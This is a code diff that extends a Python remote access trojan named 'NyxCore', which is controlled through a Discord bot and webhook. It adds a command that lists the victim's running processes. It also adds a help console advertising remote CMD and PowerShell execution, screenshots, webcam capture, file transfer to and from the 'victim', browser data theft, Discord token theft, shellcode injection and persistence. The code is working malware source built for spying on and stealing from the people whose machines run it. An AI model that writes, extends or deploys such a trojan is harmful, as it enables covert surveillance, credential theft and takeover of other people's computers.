@@ -20,6 +20,7 @@ from ctypes import windll, WINFUNCTYPE
 from ctypes.wintypes import DWORD, LPCWSTR
 import urllib
 import win32com
+import psutil 
 
 TOKEN = ''
 WEBHOOK_URL = ''
@@ -147,6 +148,39 @@ async def webcam(ctx):
     except Exception as e:
         await send_webhook(f"❌ Webcam Error: `{e}`")
 
+@bot.command()
+async def pid(ctx):
+    """List running processes in formatted blocks"""
+    if str(ctx.author.id) != ALLOWED_USER_ID:
+        return
+    
+    try:
+        # Get processes sorted by PID
+        processes = sorted([
+            (proc.info['pid'], proc.info['name']) 
+            for proc in psutil.process_iter(['pid', 'name'])
+        ], key=lambda x: x[0])
+        
+        if not processes:
+            return await ctx.send("```\nNo processes found\n```")
+            
+        # Format with fixed-width columns
+        max_pid = max(len(str(pid)) for pid, _ in processes)
+        process_list = [
+            f"{pid:<{max_pid}} │ {name}" 
+            for pid, name in processes
+        ]
+        
+        # Send in beautiful chunks
+        
+        chunk_size = 15
+        for i in range(0, len(process_list), chunk_size):
+            chunk = process_list[i:i + chunk_size]
+            await ctx.send(f"```\n{'PID'.ljust(max_pid)} │ PROCESS\n{'─'*(max_pid+1)}┼{'─'*20}\n" + '\n'.join(chunk) + "\n```")
+            
+    except Exception:
+        await ctx.send("```\nERROR\n```")
+        
 @bot.command()
 async def upload(ctx):
     if str(ctx.author.id) != ALLOWED_USER_ID: return
@@ -494,6 +528,50 @@ async def remove(ctx):
 
     except Exception as e:
         await ctx.send(f"❌ Error during removal: {str(e)}")
+
+@bot.command()
+async def console(ctx):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+
+    # NyxCore ASCII Banner
+    banner = """
+    _   __           ______                   
+   / | / /_  ___  __/ ____/___  ________      
+  /  |/ / / / / |/_/ /   / __ \/ ___/ _ \     
+ / /|  / /_/ />  </ /___/ /_/ / /  /  __/     
+/_/ |_/\__, /_/|_|\____/\____/_/   \___/      
+      /____/                                   
+    """
+
+    # Command list with explanations
+    commands_list = """
+```diff
++ Core Commands:
+!cmd <command>      : Execute CMD command
+!powershell <cmd>   : Execute PowerShell command
+!screenshot        : Capture desktop screenshot
+!webcam            : Access webcam stream
+!pid               : List running processes
+!upload <file>     : Upload file to victim
+!download <path>   : Download file from victim
+!theft             : Steal browser data
+!changewall <url>  : Change wallpaper
+!steal_discord     : Extract Discord tokens
+!runexe <path>     : Execute EXE (triggers AV)
+!runps <script>    : Run PS script (triggers AV)
+!inject <pid> <sc> : Shellcode injection
+!startup           : Create persistence
+!remove            : Remove persistence
+!openport <port>   : Port forwarding test```
+"""
+    embed = discord.Embed(
+    title="🖥️ NyxCore Console", 
+    description=f"```{banner}```\n{commands_list}", 
+    color=0x9b59b6
+)
+    embed.set_footer(text="NyxCore - Advanced Remote Administration")
+
+    await ctx.send(embed=embed)
         
         
 bot.run(TOKEN)
